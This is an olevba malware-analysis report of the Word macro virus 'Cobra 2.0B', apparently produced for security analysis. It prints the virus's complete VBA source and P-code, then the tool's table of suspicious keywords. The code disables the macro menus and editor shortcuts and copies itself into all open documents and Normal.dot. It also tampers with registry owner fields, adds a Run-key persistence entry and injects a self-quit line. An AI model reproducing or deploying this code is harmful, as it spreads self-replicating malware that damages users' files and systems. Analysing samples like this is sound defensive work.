olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra_20B.bas 
in file: ./Virus.MSWord.Cobra.g - OLE stream: 'Macros/VBA/Cobra_20B'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0B
Sub Infect()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Enabled = False
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
AT = Application.NormalTemplate.FullName
AD = ActiveDocument.FullName
For Each doc In Documents
OD = doc.FullName
For NC = 1 To doc.VBProject.VBComponents.Count '
MC = (1999 + 1) - 2000
If doc.VBProject.VBComponents(NC).Name <> "Reference to Normal" And _
doc.VBProject.VBComponents(NC).Name <> "ThisDocument" And _
doc.VBProject.VBComponents(NC).Name <> "Cobra_20B" Then
Application.OrganizerDelete Source:=OD, _
Name:=doc.VBProject.VBComponents(NC).Name, _
Object:=wdOrganizerObjectProjectItems
End If
If doc.VBProject.VBComponents(NC).Name = "Cobra_20B" Then
MC = (2000 + 1) - (1999 + 1)
End If
Next
If MC = (1999 + 1) - 2000 Then
Application.OrganizerCopy Source:=AD, _
Destination:=OD, Name:="Cobra_20B", _
Object:=wdOrganizerObjectProjectItems
End If
Next
MC = (1999 + 1) - 2000
For NC = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(NC).Name <> "ThisDocument" And _
NormalTemplate.VBProject.VBComponents(NC).Name <> "Cobra_20B" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=NormalTemplate.VBProject.VBComponents(NC).Name, _
Object:=wdOrganizerObjectProjectItems
End If
If NormalTemplate.VBProject.VBComponents(NC).Name = "Cobra_20B" Then
MC = (2000 + 1) - (1999 + 1)
End If
Next
If MC = (1999 + 1) - 2000 Then
Application.OrganizerCopy Source:=AD, Destination:=NormalTemplate.FullName, _
Name:="Cobra_20B", Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub IntCobra()
FDt = Format("01/01/2000", "mm/dd/yyyy")
CDt = Format(Date, "mm/dd/yyyy")
PDt = DateValue(CDt) - DateValue(FDt)
WTit = "Y2K+D" & PDt
GeWd = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra VS LITON" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra VS LITON"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,(PA12A19H2AG)/DHK/BD"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Infday") = Format(Date, "mm/dd/yyyy")
End If
Curd = Date
InfD = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Infday")
TinfD = DateValue(Curd) - DateValue(InfD)
If TinfD > 30 Then
ActiveDocument.SaveAs GeWd + "\Cobra.doc"
ActiveDocument.ActiveWindow.Caption = WTit
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Infected") <> GeWd + "\Cobra.Doc" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Infected") = GeWd + "\Cobra.Doc"
If ActiveDocument.VBProject.VBComponents("Cobra_20B").CodeModule.Lines(78, 1) <> "Application.Quit" Then
ActiveDocument.VBProject.VBComponents("Cobra_20B").CodeModule.InsertLines 78, "Application.Quit"
ActiveDocument.Save
End If
End If
End If
End Sub
Sub AutoOpen()
Call Infect
Call IntCobra
End Sub
Sub AutoClose()
Call Infect
Call IntCobra
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cobra.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/Cobra_20B - 11869 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0012 "Cobra Version 2.0B"
' Line #1:
' 	FuncDefn (Sub Infect())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #6:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #8:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #9:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	St AT 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St AD 
' Line #11:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #12:
' 	Ld doc 
' 	MemLd FullName 
' 	St OD 
' Line #13:
' 	StartForVariable 
' 	Ld NC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x002F 0x0000 ""
' Line #14:
' 	LitDI2 0x07CF 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitDI2 0x07D0 
' 	Sub 
' 	St MC 
' Line #15:
' 	LineCont 0x0008 0E 00 00 00 1B 00 00 00
' 	Ld NC 
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Ld NC 
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	Ld NC 
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20B"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #16:
' 	LineCont 0x0008 07 00 00 00 14 00 00 00
' 	Ld OD 
' 	ParamNamed Source 
' 	Ld NC 
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld NC 
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20B"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x07D0 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitDI2 0x07CF 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Sub 
' 	St MC 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' 	Ld MC 
' 	LitDI2 0x07CF 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitDI2 0x07D0 
' 	Sub 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LineCont 0x0008 07 00 00 00 0F 00 00 00
' 	Ld AD 
' 	ParamNamed Source 
' 	Ld OD 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Cobra_20B"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' 	LitDI2 0x07CF 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitDI2 0x07D0 
' 	Sub 
' 	St MC 
' Line #27:
' 	StartForVariable 
' 	Ld NC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #28:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld NC 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld NC 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20B"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #29:
' 	LineCont 0x0008 09 00 00 00 16 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NC 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld NC 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20B"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x07D0 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitDI2 0x07CF 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Sub 
' 	St MC 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	Ld MC 
' 	LitDI2 0x07CF 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitDI2 0x07D0 
' 	Sub 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld AD 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Cobra_20B"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub IntCobra())
' Line #40:
' 	LitStr 0x000A "01/01/2000"
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St FDt 
' Line #41:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CDt 
' Line #42:
' 	Ld CDt 
' 	ArgsLd DateValue 0x0001 
' 	Ld FDt 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	St PDt 
' Line #43:
' 	LitStr 0x0005 "Y2K+D"
' 	Ld PDt 
' 	Concat 
' 	St WTit 
' Line #44:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St GeWd 
' Line #45:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000E "Cobra VS LITON"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitStr 0x000E "Cobra VS LITON"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #47:
' 	LitStr 0x0018 "349,(PA12A19H2AG)/DHK/BD"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #48:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0006 "Infday"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld Date 
' 	St Curd 
' Line #51:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0006 "Infday"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St InfD 
' Line #52:
' 	Ld Curd 
' 	ArgsLd DateValue 0x0001 
' 	Ld InfD 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	St TinfD 
' Line #53:
' 	Ld TinfD 
' 	LitDI2 0x001E 
' 	Gt 
' 	IfBlock 
' Line #54:
' 	Ld GeWd 
' 	LitStr 0x000A "\Cobra.doc"
' 	Add 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #55:
' 	Ld WTit 
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemSt Caption 
' Line #56:
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0008 "Infected"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld GeWd 
' 	LitStr 0x000A "\Cobra.Doc"
' 	Add 
' 	Ne 
' 	IfBlock 
' Line #57:
' 	Ld GeWd 
' 	LitStr 0x000A "\Cobra.Doc"
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0008 "Infected"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #58:
' 	LitDI2 0x004E 
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "Cobra_20B"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0010 "Application.Quit"
' 	Ne 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x004E 
' 	LitStr 0x0010 "Application.Quit"
' 	LitStr 0x0009 "Cobra_20B"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub AutoOpen())
' Line #66:
' 	ArgsCall (Call) Infect 0x0000 
' Line #67:
' 	ArgsCall (Call) IntCobra 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub AutoClose())
' Line #70:
' 	ArgsCall (Call) Infect 0x0000 
' Line #71:
' 	ArgsCall (Call) IntCobra 0x0000 
' Line #72:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

